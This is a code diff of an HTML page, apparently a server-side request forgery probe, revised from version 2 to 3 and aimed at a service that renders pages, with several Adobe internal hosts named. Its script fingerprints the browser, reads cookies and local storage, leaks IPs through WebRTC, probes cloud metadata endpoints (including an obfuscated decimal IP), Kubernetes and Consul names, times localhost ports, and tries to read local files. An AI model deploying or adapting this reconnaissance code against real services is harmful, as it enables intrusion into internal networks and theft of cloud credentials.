@@ -1,173 +1,125 @@
 <html><body>
-<h2>SSRF Probe v2</h2>
+<h2>SSRF Probe v3</h2>
 <pre id="r"></pre>
 <script>
 const R=document.getElementById('r');
 function L(s){R.textContent+=s+'\n';}
 
-// 1. Extended environment
 L('== ENV ==');
 L('UA: '+navigator.userAgent);
 L('Platform: '+navigator.platform);
 L('Cores: '+navigator.hardwareConcurrency);
 L('Webdriver: '+navigator.webdriver);
 L('Memory: '+(navigator.deviceMemory||'?')+'GB');
-L('Lang: '+navigator.language);
-L('Languages: '+JSON.stringify(navigator.languages));
 L('Location: '+location.href);
-L('CookieEnabled: '+navigator.cookieEnabled);
-L('DoNotTrack: '+navigator.doNotTrack);
-L('MaxTouchPoints: '+navigator.maxTouchPoints);
-L('PDF: '+(navigator.pdfViewerEnabled||'?'));
-try{L('Connection: '+JSON.stringify({type:navigator.connection?.type,downlink:navigator.connection?.downlink,rtt:navigator.connection?.rtt,effectiveType:navigator.connection?.effectiveType}));}catch(e){L('Connection: N/A');}
-try{L('Plugins: '+navigator.plugins.length);for(var i=0;i<Math.min(navigator.plugins.length,5);i++)L('  '+navigator.plugins[i].name);}catch(e){}
+try{L('Connection: '+JSON.stringify({dl:navigator.connection?.downlink,rtt:navigator.connection?.rtt,type:navigator.connection?.effectiveType}));}catch(e){}
 
-// 2. WebRTC - multiple STUN servers, wait longer for srflx
+// WebRTC - no wait, results append via callback
 L('\n== WebRTC ==');
-var iceResults=[];
 try{
   var pc=new RTCPeerConnection({iceServers:[
     {urls:'stun:stun.l.google.com:19302'},
-    {urls:'stun:stun1.l.google.com:19302'},
-    {urls:'stun:stun2.l.google.com:19302'}
+    {urls:'stun:stun1.l.google.com:19302'}
   ]});
   pc.createDataChannel('d');
   pc.onicecandidate=function(e){
-    if(!e.candidate){L('ICE gathering done');return;}
-    var c=e.candidate.candidate;
-    iceResults.push(c);
-    L('ICE: '+c);
-    if(c.indexOf('typ srflx')>-1)L('  ** SERVER REFLEXIVE (public IP!) **');
-    if(c.indexOf('typ relay')>-1)L('  ** RELAY **');
+    if(!e.candidate)return;
+    L('ICE: '+e.candidate.candidate);
   };
-  pc.onicegatheringstatechange=function(){L('ICE state: '+pc.iceGatheringState);};
   pc.createOffer().then(function(o){
     pc.setLocalDescription(o);
-    L('SDP created');
-    var sdp=o.sdp;
-    var ips=sdp.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
+    var ips=o.sdp.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
     if(ips)L('SDP IPs: '+JSON.stringify([...new Set(ips)]));
   });
-}catch(e){L('WebRTC err: '+e.message);}
+}catch(e){L('WebRTC: '+e.message);}
 
-// 3. HTTPS fetch to internal Adobe services
-async function fetchHttps(url,label){
-  var t=Date.now();
-  try{
-    var r=await fetch(url,{mode:'cors',credentials:'omit'});
-    var txt=await r.text();
-    L(label+': s='+r.status+' len='+txt.length+' t='+(Date.now()-t)+'ms');
-    if(txt.length<500)L('  body: '+txt.substring(0,400));
-  }catch(e){
-    L(label+': ERR='+e.message+' t='+(Date.now()-t)+'ms');
+// Performance API - synchronous
+L('\n== Perf ==');
+try{
+  var nav=performance.getEntriesByType('navigation')[0];
+  if(nav){
+    L('DNS: '+(nav.domainLookupEnd-nav.domainLookupStart).toFixed(1)+'ms');
+    L('TCP: '+(nav.connectEnd-nav.connectStart).toFixed(1)+'ms');
+    L('TTFB: '+(nav.responseStart-nav.requestStart).toFixed(1)+'ms');
+    L('Proto: '+nav.nextHopProtocol);
+    L('Transfer: '+nav.transferSize+'B');
   }
-}
-async function fetchNoCors(url,label){
-  var t=Date.now();
-  try{
-    var r=await fetch(url,{mode:'no-cors'});
-    L(label+' nc: type='+r.type+' s='+r.status+' t='+(Date.now()-t)+'ms');
-  }catch(e){
-    L(label+' nc: ERR='+e.message+' t='+(Date.now()-t)+'ms');
-  }
-}
+}catch(e){}
 
-// 4. DNS timing
-async function dnsProbe(host,label){
-  var t=Date.now();
-  try{
-    await fetch('https://'+host+'/',{mode:'no-cors',signal:AbortSignal.timeout(3000)});
-    L(label+': OK t='+(Date.now()-t)+'ms');
-  }catch(e){
-    L(label+': '+e.name+' t='+(Date.now()-t)+'ms');
-  }
-}
+L('\n== Screen ==');
+L(screen.width+'x'+screen.height+' @'+devicePixelRatio+'x inner='+innerWidth+'x'+innerHeight);
 
-// 5. Performance API
-function perfEntries(){
-  L('\n== Performance ==');
-  try{
-    var nav=performance.getEntriesByType('navigation')[0];
-    if(nav){
-      L('DNS: '+(nav.domainLookupEnd-nav.domainLookupStart).toFixed(1)+'ms');
-      L('TCP: '+(nav.connectEnd-nav.connectStart).toFixed(1)+'ms');
-      L('TLS: '+(nav.secureConnectionStart>0?(nav.connectEnd-nav.secureConnectionStart).toFixed(1):'N/A')+'ms');
-      L('TTFB: '+(nav.responseStart-nav.requestStart).toFixed(1)+'ms');
-      L('Protocol: '+nav.nextHopProtocol);
-      L('TransferSize: '+nav.transferSize);
-    }
-  }catch(e){L('Perf err: '+e.message);}
-}
+L('\n== Storage ==');
+L('Cookies: "'+document.cookie+'"');
+try{L('LS: '+Object.keys(localStorage).length+' keys');}catch(e){L('LS: '+e.message);}
 
-// 6. Screen/window
-function screenProbe(){
-  L('\n== Screen ==');
-  L('Screen: '+screen.width+'x'+screen.height+' @'+devicePixelRatio+'x');
-  L('Window: '+window.innerWidth+'x'+window.innerHeight);
-  L('ColorDepth: '+screen.colorDepth);
-}
-
-// 7. Precise port timing
-async function timingScan(host,port){
-  return new Promise(function(ok){
-    var t=performance.now();
-    var img=new Image();
-    var done=false;
-    img.onload=function(){if(!done){done=true;ok({s:'LOAD',t:performance.now()-t});}};
-    img.onerror=function(){if(!done){done=true;ok({s:'ERR',t:performance.now()-t});}};
-    img.src='http://'+host+':'+port+'/'+Math.random().toString(36);
-    setTimeout(function(){if(!done){done=true;ok({s:'TIMEOUT',t:5000});}},5000);
-  });
-}
-
+// Async probes - run immediately, no wait
 (async function(){
-  await new Promise(r=>setTimeout(r,8000));
-  L('\n== WebRTC Summary: '+iceResults.length+' candidates ==');
 
-  perfEntries();
-  screenProbe();
+  L('\n== HTTPS Fetch ==');
+  async function fh(url,label){
+    var t=Date.now();
+    try{
+      var r=await fetch(url,{mode:'cors',credentials:'omit'});
+      var txt=await r.text();
+      L(label+': '+r.status+' len='+txt.length+' '+(Date.now()-t)+'ms');
+      if(txt.length<300)L('  '+txt.substring(0,250));
+    }catch(e){L(label+': '+e.message+' '+(Date.now()-t)+'ms');}
+  }
+  async function fn(url,label){
+    var t=Date.now();
+    try{
+      var r=await fetch(url,{mode:'no-cors'});
+      L(label+': type='+r.type+' '+(Date.now()-t)+'ms');
+    }catch(e){L(label+': '+e.message+' '+(Date.now()-t)+'ms');}
+  }
 
-  L('\n== Storage ==');
-  L('Cookies: "'+document.cookie+'"');
-  try{L('LS keys: '+Object.keys(localStorage).length);}catch(e){L('LS: '+e.message);}
-
-  L('\n== HTTPS Fetch (bypass HTTP proxy?) ==');
-  await fetchHttps('https://dcdiscovery.adobe.io/1785845424/index','DC-Discovery');
-  await fetchHttps('https://dc-genai-access-provisioning-api.adobe.io/','Provision');
-  await fetchNoCors('https://senseicore-ue1.adobe.io/','Sensei');
-  await fetchNoCors('https://dc-argus.adobe.io/','Argus');
-  await fetchNoCors('https://platform-cs-jpn3.adobe.io/','PlatformCS');
+  await fh('https://httpbin.org/ip','extIP');
+  await fn('https://senseicore-ue1.adobe.io/','Sensei');
+  await fn('https://dc-argus.adobe.io/','Argus');
+  await fn('https://platform-cs-jpn3.adobe.io/','PlatCS');
+  await fn('https://dc-genai-access-provisioning-api.adobe.io/','Prov');
 
   L('\n== DNS Timing ==');
-  await dnsProbe('169.254.169.254','IMDS');
-  await dnsProbe('ec2.internal','ec2');
-  await dnsProbe('metadata.google.internal','gcp');
-  await dnsProbe('kubernetes.default.svc','k8s');
-  await dnsProbe('consul.service.consul','consul');
-
-  L('\n== Port Timing (localhost, ms) ==');
-  var ports=[22,80,443,3000,5000,6379,8080,8443,9090,9222,27017];
-  for(var i=0;i<ports.length;i++){
-    var r=await timingScan('127.0.0.1',ports[i]);
-    L('127.0.0.1:'+ports[i]+' '+r.s+' '+(r.t).toFixed(2)+'ms');
+  async function dns(host,label){
+    var t=Date.now();
+    try{await fetch('https://'+host+'/',{mode:'no-cors',signal:AbortSignal.timeout(2000)});}catch(e){}
+    L(label+': '+(Date.now()-t)+'ms');
   }
-
-  L('\n== Port Timing (IMDS decimal) ==');
-  var r1=await timingScan('2852039166',80);
-  L('2852039166:80 '+r1.s+' '+(r1.t).toFixed(2)+'ms');
-  var r2=await timingScan('2852039166',443);
-  L('2852039166:443 '+r2.s+' '+(r2.t).toFixed(2)+'ms');
-
-  L('\n== Chrome internals ==');
-  try{await fetch('chrome://version/');L('chrome://version: OK');}catch(e){L('chrome://version: '+e.message);}
-  try{await fetch('file:///etc/hostname');L('file hostname: OK');}catch(e){L('file hostname: '+e.message);}
-  try{await fetch('file:///proc/self/cgroup');L('file cgroup: OK');}catch(e){L('file cgroup: '+e.message);}
+  await dns('169.254.169.254','IMDS');
+  await dns('ec2.internal','ec2');
+  await dns('kubernetes.default.svc','k8s');
+  await dns('consul.service.consul','consul');
 
   L('\n== Beacon ==');
-  try{L('Beacon IMDS: '+navigator.sendBeacon('http://169.254.169.254/','x'));}catch(e){L('Beacon: '+e.message);}
-  try{L('Beacon decimal: '+navigator.sendBeacon('http://2852039166/','x'));}catch(e){L('Beacon dec: '+e.message);}
+  try{L('IMDS: '+navigator.sendBeacon('http://169.254.169.254/latest/meta-data/','x'));}catch(e){L('IMDS: '+e.message);}
+  try{L('decimal: '+navigator.sendBeacon('http://2852039166/latest/meta-data/','x'));}catch(e){L('dec: '+e.message);}
+  try{L('lo80: '+navigator.sendBeacon('http://127.0.0.1/','x'));}catch(e){L('lo: '+e.message);}
 
-  L('\n== DONE v2 ==');
+  L('\n== Chrome ==');
+  try{await fetch('chrome://version/');L('chrome://version OK');}catch(e){L('chrome:// '+e.message);}
+  try{await fetch('file:///etc/hostname');L('file hostname OK');}catch(e){L('file:// '+e.message);}
+
+  L('\n== Port Timing (ms) ==');
+  async function pt(h,p){
+    return new Promise(function(ok){
+      var t=performance.now();var done=false;
+      var img=new Image();
+      img.onload=img.onerror=function(){if(!done){done=true;ok(performance.now()-t);}};
+      img.src='http://'+h+':'+p+'/'+Math.random().toString(36);
+      setTimeout(function(){if(!done){done=true;ok(-1);}},2000);
+    });
+  }
+  var ports=[22,80,443,3000,5000,6379,8080,9090,9222,27017];
+  for(var i=0;i<ports.length;i++){
+    var d=await pt('127.0.0.1',ports[i]);
+    L('lo:'+ports[i]+' '+(d<0?'TIMEOUT':d.toFixed(1)+'ms'));
+  }
+  // IMDS decimal ports
+  L('IMDS-dec:80 '+((await pt('2852039166',80))).toFixed(1)+'ms');
+  L('IMDS-dec:443 '+((await pt('2852039166',443))).toFixed(1)+'ms');
+
+  L('\n== DONE v3 ==');
 })();
 </script>
 </body></html>
